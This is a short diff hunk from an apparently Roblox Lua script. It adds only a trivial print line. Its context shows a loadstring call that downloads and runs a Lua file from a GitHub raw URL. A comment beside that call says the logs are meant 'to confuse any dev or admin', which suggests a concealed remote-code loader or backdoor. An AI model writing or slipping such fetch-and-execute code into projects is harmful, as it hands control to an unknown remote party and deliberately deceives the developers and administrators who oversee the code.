@@ -29,3 +29,4 @@ end
 
 -- Full protection with sensible logs that are common to confuse any dev or admin
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Input50/Something/master/Logs.lua"),true))()
+print("E")
